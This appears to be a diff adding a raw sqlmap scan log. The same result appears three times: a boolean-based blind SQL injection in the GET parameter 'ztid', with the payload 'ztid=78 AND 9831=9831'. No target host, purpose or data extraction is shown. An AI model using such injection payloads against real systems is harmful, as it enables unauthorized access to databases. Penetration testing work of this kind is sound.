@@ -1,0 +1,24 @@
+sqlmap identified the following injection points with a total of 67 HTTP(s) requests:
+---
+Place: GET
+Parameter: ztid
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: ztid=78 AND 9831=9831
+---
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: ztid
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: ztid=78 AND 9831=9831
+---
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: ztid
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: ztid=78 AND 9831=9831
+---
